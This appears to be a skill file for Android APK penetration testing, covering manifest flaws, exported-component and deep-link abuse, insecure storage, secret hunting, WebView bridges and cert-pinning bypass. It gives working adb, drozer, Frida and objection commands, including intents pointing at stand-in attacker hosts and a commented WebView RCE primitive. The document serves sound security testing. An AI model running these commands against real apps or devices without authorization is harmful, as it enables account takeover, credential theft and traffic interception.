---
name: android-apk
description: Android APK security testing - static decompilation, AndroidManifest analysis, insecure storage, hardcoded secrets, cleartext traffic, WebView RCE, deep link abuse, and TLS/cert-pinning bypass
---

# Android APK Security Testing

An Android APK is a ZIP container bundling compiled Dalvik bytecode (`classes*.dex`), resources, native libraries, and the `AndroidManifest.xml` that declares the app's components and permissions. The bulk of mobile findings come from the manifest (over-exported components, debuggable/backup flags), insecure on-device storage, secrets baked into the binary, and trust-decision code (TLS validation, cert pinning, WebView bridges) that an attacker controls once the device is rooted. Static analysis recovers logic and secrets without running anything; dynamic analysis with Frida/objection on a rooted device or emulator hooks the running process to defeat client-side controls. Most exported-component and deep-link abuse needs no root and runs from `adb` against a stock device. Cert-pinning bypass, Keychain/keystore inspection, and runtime hooking require a rooted device or a Google-APIs (non-Play) emulator image.

## Attack Surface

**Scope**
- `AndroidManifest.xml` - declared activities, services, broadcast receivers, content providers, permissions, `intent-filter`s
- DEX bytecode (`classes.dex`, `classes2.dex`, ...) decompiled to Java/Smali
- Bundled native libs (`lib/<abi>/*.so`), assets, raw resources, `res/xml/network_security_config.xml`
- On-device storage: `/data/data/<pkg>/shared_prefs`, `databases`, `files`, plus external/scoped storage
- Hardcoded strings, certificates, and keystores in `res/`, `assets/`, and `strings.xml`
- IPC surface: exported components, custom permissions, deep links (`scheme://`), App Links (`autoVerify`)

**Entry Points**
- Exported activities/services/receivers/providers callable by any other app via `adb shell am`/`content`
- `intent-filter`-matched deep links and App Links reachable from a browser or another app
- WebView `addJavascriptInterface` bridges reachable from loaded web content
- World-readable files, `MODE_WORLD_READABLE` prefs, and data written to shared external storage
- `android:debuggable="true"` enabling `run-as`/JDWP attach; `android:allowBackup="true"` enabling `adb backup`

**Permissions and identity**
- Manifest `permission` and `uses-permission` plus custom `protectionLevel` (`normal`/`dangerous`/`signature`)
- Components protected only by `normal`-level custom permissions are effectively unprotected (any app can request them)
- Signature scheme in use (v1 JAR signature, v2/v3 APK Signature Scheme) - v1-only signing is vulnerable to the Janus class
- `taskAffinity` and `launchMode` settings that govern task/back-stack placement

## Key Vulnerabilities

### Manifest Misconfiguration and Exported Components

- `android:exported="true"` (or implicit-true when an `intent-filter` is present pre-API-31) on activities/services/receivers/providers
- `android:debuggable="true"` shipped in production - allows `run-as <pkg>` shell and JDWP debugger attach
- `android:allowBackup="true"` (default) - `adb backup` extracts the full private data dir on non-rooted devices
- Content providers with `android:grantUriPermissions="true"` or path traversal in `openFile()`
- Custom permissions declared with `protectionLevel="normal"` guarding sensitive components

**Test:**
```
apktool d target.apk -o target_src
jadx -d target_out target.apk
grep -nE 'android:(exported|debuggable|allowBackup)' target_src/AndroidManifest.xml
# enumerate attack surface with drozer (rooted device or emulator + drozer agent app)
drozer console connect
run app.package.attacksurface com.target.app
run app.activity.info -a com.target.app -i
run app.provider.info -a com.target.app
```

### Intent Injection and Component Abuse

- Exported activities trusting `Intent` extras for auth state, user id, or file paths (see idor, mass_assignment)
- Exported services/receivers performing privileged work on attacker-supplied extras
- `taskAffinity` hijack (StrandHogg class): a malicious app declaring the victim's affinity inserts itself into the task back stack to phish credentials
- Implicit intents leaking sensitive extras to any app with a matching filter

**Test:**
```
# launch an exported activity directly and inject extras
adb shell am start -n com.target.app/.AdminActivity --es role admin --ez is_premium true
# send a crafted broadcast to an exported receiver
adb shell am broadcast -a com.target.app.ACTION_RESET --es token attacker
# start an exported service with extras
adb shell am startservice -n com.target.app/.SyncService --es url http://attacker/
# via drozer
run app.activity.start --component com.target.app .AdminActivity --extra string role admin
```

### Insecure Data Storage

- Credentials/tokens in `shared_prefs/*.xml` in cleartext or trivially obfuscated
- Sensitive rows in unencrypted SQLite (`databases/*.db`); SQLCipher key hardcoded in DEX
- PII or tokens written to external/shared storage readable by other apps
- Auth material cached in `WebView` cookies, `localStorage`, or HTTP response cache

**Test:**
```
adb shell run-as com.target.app ls -la /data/data/com.target.app/shared_prefs /data/data/com.target.app/databases
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/auth.xml
adb exec-out run-as com.target.app cat /data/data/com.target.app/databases/app.db > app.db && sqlite3 app.db .tables
# if allowBackup=true, extract without root
adb backup -f backup.ab -noapk com.target.app
( printf '\x1f\x8b\x08\x00\x00\x00\x00\x00' ; tail -c +25 backup.ab ) | gunzip | tar xvf -
```

### Hardcoded Secrets and API Keys

- API keys, cloud credentials, signing secrets, and private endpoints in `strings.xml`, DEX constants, or native libs
- Firebase database URLs with open read/write rules; backend keys reused server-side

**Test:**
```
jadx -d target_out target.apk
grep -rnE '(AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|sk_live_[0-9A-Za-z]+|-----BEGIN (RSA|EC) PRIVATE KEY-----)' target_out target_src
strings -n 8 target_src/lib/arm64-v8a/*.so | grep -iE 'secret|api[_-]?key|password|token'
# full static scan
mobsf  # then upload target.apk via the web UI, or use the REST API
curl -s -F 'file=@target.apk' -H "Authorization: $MOBSF_KEY" http://127.0.0.1:8000/api/v1/upload
```

### Cleartext Traffic and Network Security Config

- `android:usesCleartextTraffic="true"` or a `network_security_config.xml` permitting cleartext to backend domains
- `<trust-anchors>` adding `user` CA store in production (lets any installed CA MITM the app)
- `<debug-overrides>` accidentally shipped, or no config at all on API < 28 (cleartext allowed by default)

**Test:**
```
cat target_src/res/xml/network_security_config.xml
grep -nE 'cleartextTrafficPermitted|trust-anchors|<certificates src="user"' target_src/res/xml/*.xml
grep -n 'usesCleartextTraffic' target_src/AndroidManifest.xml
# observe actual traffic through an intercepting proxy
adb shell settings put global http_proxy <attacker-ip>:8080
```

### WebView Vulnerabilities

- `addJavascriptInterface(obj, "name")` exposing a Java object to loaded JS - reflection to `Runtime.exec` on API < 17, and direct method abuse on any version
- `setJavaScriptEnabled(true)` combined with loading attacker-influenced or cleartext URLs
- `setAllowFileAccess(true)`/`setAllowFileAccessFromFileURLs`/`setAllowUniversalAccessFromFileURLs` enabling `file://` reads of the app sandbox from loaded content
- `shouldOverrideUrlLoading` returning false for arbitrary schemes; `loadUrl()` of intent-supplied URLs (see xss for the in-WebView payload)

**Test:**
```
grep -rnE 'addJavascriptInterface|setJavaScriptEnabled|setAllowFileAccess|setAllowUniversalAccessFromFileURLs|loadUrl' target_out/sources
# JS-to-Java RCE primitive on a vulnerable bridge named "Android" (API<17)
# <script>console.log(Android.getClass().forName('java.lang.Runtime').getMethod('exec',[String]).invoke(...))</script>
# drive a file:// read once a loadUrl sink is found
adb shell am start -a android.intent.action.VIEW -d 'https://attacker/xss.html' -n com.target.app/.WebActivity
```

### Insecure Deep Links and App Links

- Deep links passing tokens, redirect targets, or object ids straight into privileged flows (see idor, ssrf for the downstream sink)
- App Links without `android:autoVerify="true"` or with an unreachable/incorrect `assetlinks.json`, allowing a malicious app to claim the host
- WebView-backed deep link handlers that `loadUrl()` an attacker-controlled `url=` parameter

**Test:**
```
# enumerate scheme/host filters
grep -nA3 'intent-filter' target_src/AndroidManifest.xml | grep -E 'android:scheme|android:host|autoVerify'
# fire a deep link from adb (acts like a browser/another app)
adb shell am start -a android.intent.action.VIEW -d 'targetapp://reset?token=attacker&next=https://evil'
# check App Link verification state
adb shell pm get-app-links com.target.app
curl -s https://target.com/.well-known/assetlinks.json
```

### TLS Validation and Certificate Pinning Bypass

- Custom `TrustManager`/`HostnameVerifier` that accepts all certs (`checkServerTrusted` empty, `verify` returns true)
- Pinning implemented client-side (OkHttp `CertificatePinner`, `TrustKit`, network-security-config pins) - all bypassable on a rooted device
- TLS validation bypass is a client-side control: it protects against network attackers, not against an attacker who owns the device

**Test:**
```
grep -rnE 'TrustManager|checkServerTrusted|HostnameVerifier|ALLOW_ALL|CertificatePinner|setHostnameVerifier' target_out/sources
# defeat pinning at runtime (rooted device or rooted/Google-APIs emulator)
objection -g com.target.app explore -s "android sslpinning disable"
frida -U -f com.target.app -l frida-android-unpinning.js
# combine with a system-CA proxy to read decrypted traffic
adb root && adb remount  # install proxy CA into system store
```

### Janus and v1-Signature Tampering

- APKs signed with v1 (JAR) signing only are vulnerable to Janus (CVE-2017-13156): a DEX file can be prepended to the APK ZIP and still pass v1 verification on API 21-26
- v2/v3 APK Signature Scheme covers the whole file and defeats Janus; v1-only on older targets is repackageable

**Test:**
```
apksigner verify --verbose --print-certs target.apk
# Verified using v1 scheme (JAR signing): true / v2: false  => Janus-class exposure on API<=26
# repackage-and-resign test (cert-pinning/root-detection patching workflow)
apktool b target_src -o patched.apk
apksigner sign --ks debug.keystore --ks-pass pass:android patched.apk
adb install -r patched.apk
```

## Bypass Techniques

**Root and emulator detection bypass**
- Hook detection routines (`RootBeer`, file checks for `su`/Magisk, `getprop` reads) with objection (`android root disable`) or a Frida script returning false
- Magisk DenyList / Zygisk hides root from a target package without disabling it system-wide

**Repackaging**
- `apktool d` -> patch Smali (flip a boolean, no-op a pinning/root check) -> `apktool b` -> resign with `apksigner` -> reinstall; works whenever integrity is checked only client-side

**Proxy and CA trust**
- On API >= 24 apps ignore the user CA store by default - install the proxy CA into the system store on a rooted device (`/system/etc/security/cacerts`) or use objection/Frida pinning bypass instead

**Component permission gaps**
- Custom `protectionLevel="normal"` permissions are grantable by any app - treat such "protected" exported components as fully exposed

## Testing Methodology

1. **Unpack** - `apktool d` for the manifest and Smali, `jadx`/`dex2jar` for readable Java, `unzip -l` to inventory assets and native libs
2. **Baseline scan** - run the APK through MobSF for a fast pass over manifest flags, hardcoded secrets, weak crypto, and dangerous APIs
3. **Manifest review** - enumerate exported components, debuggable/backup flags, custom permission levels, deep-link filters, and the network security config
4. **Static secret hunt** - grep DEX and native strings for keys, endpoints, and private certs; trace where they're used
5. **Component abuse** - drive exported activities/services/receivers and providers from `adb`/drozer; inject extras into auth-bearing flows
6. **Storage review** - on a rooted device or via `run-as`/`adb backup`, dump `shared_prefs`, `databases`, and external storage; check for plaintext secrets
7. **WebView and deep links** - locate `addJavascriptInterface`/`loadUrl`/file-access sinks and reachable scheme/App-Link handlers; fire crafted URLs
8. **Runtime instrumentation** - attach Frida/objection (rooted device or Google-APIs emulator) to bypass pinning/root detection and read decrypted traffic through a proxy
9. **Tamper test** - check signature scheme with `apksigner`; for v1-only/older targets, repackage and resign to confirm integrity is not enforced server-side

## Validation

1. For exported components, show the privileged action occurring (state change, data return) from an `adb`/drozer invocation that no UI path exposes
2. For insecure storage, extract the concrete secret (token, key, PII) from the dumped file and confirm it is live by using it against the backend
3. For hardcoded secrets, demonstrate the key authenticating to its service; do not flag rotated, sandbox, or client-public keys (Firebase web API keys are public by design)
4. For pinning/TLS bypass, capture a decrypted request/response pair through the proxy after the bypass - the proof is the plaintext app traffic
5. For deep links/WebView, demonstrate the downstream effect (IDOR read, SSRF, file exfil) reached through the link, not merely that the link opens
6. For Janus/repackaging, show the resigned APK installing and running, or the prepended-DEX APK passing `apksigner verify` on the affected API range

## False Positives

- `android:exported="true"` on a launcher activity or a component guarded by a real `signature`-level permission - not an exposure
- Hardcoded "secrets" that are public identifiers (Firebase web API keys, OAuth client ids, Google Maps keys restricted by package/SHA)
- Pinning/TLS "bypass" achieved only on a rooted device - that is the expected client-side trust model, not a server-side flaw, unless the backend also trusts the client blindly
- `allowBackup` flagged when the manifest also sets a `fullBackupContent`/`dataExtractionRules` that excludes sensitive paths
- WebView `addJavascriptInterface` on API >= 17 where exposed methods are annotated `@JavascriptInterface` and expose nothing sensitive
- Cleartext config entries scoped to `localhost`/debug domains only

## Impact

- Account takeover and privilege escalation via intent injection into auth/role-bearing flows
- Theft of credentials, session tokens, and PII from insecure on-device storage or backups
- Backend compromise from hardcoded API keys, cloud credentials, or signing secrets
- Remote code execution in the app process through a WebView JavaScript bridge
- Network MITM and traffic decryption where TLS validation is broken or pinning is the only control
- App impersonation / malware distribution via Janus tampering or repackaging when integrity is unverified server-side
- Cross-app data leakage through over-exported content providers and shared-storage writes

## Pro Tips

1. Read `AndroidManifest.xml` first - exported components, `debuggable`, `allowBackup`, and deep-link filters are the highest-yield findings and need no root
2. `jadx` for readable logic, `apktool` for the real manifest and Smali patching - use both; jadx's decompiled manifest can drop attributes
3. `run-as <pkg>` works on any `debuggable` build without root - it is the fastest path to the private data dir
4. Pre-API-31, a component with an `intent-filter` is exported by default even without `android:exported` - check the `targetSdkVersion`
5. Custom permissions at `protectionLevel="normal"` protect nothing - any installed app can hold them
6. Use a Google-APIs (not Play Store) emulator image or a Magisk-rooted device for Frida - Play-protected images block the agent
7. When pinning blocks the proxy, run objection's `android sslpinning disable` before launching the flow, not after - the pinned connection is made early
8. `apksigner verify --verbose` tells you instantly whether Janus (v1-only) applies; v2/v3 closes it
9. Decompiled string obfuscation usually decrypts at a single helper method - hook it with Frida to dump plaintext secrets at runtime instead of reversing the cipher

## Summary

Android findings chain from the manifest outward: an over-exported activity or a token-bearing deep link gives an attacker a foothold (idor/mass_assignment-style abuse), insecure storage and hardcoded secrets supply credentials, and broken TLS or a WebView bridge turns network position or loaded content into traffic decryption or in-process RCE. Static analysis with apktool/jadx/MobSF surfaces the logic and secrets; `adb`/drozer exercise the IPC surface with no root; Frida/objection on a rooted device defeat the client-side controls (pinning, root detection) that were the app's only protection. Prove each finding with the concrete effect - extracted secret, decrypted request, or privileged action - not the configuration alone.
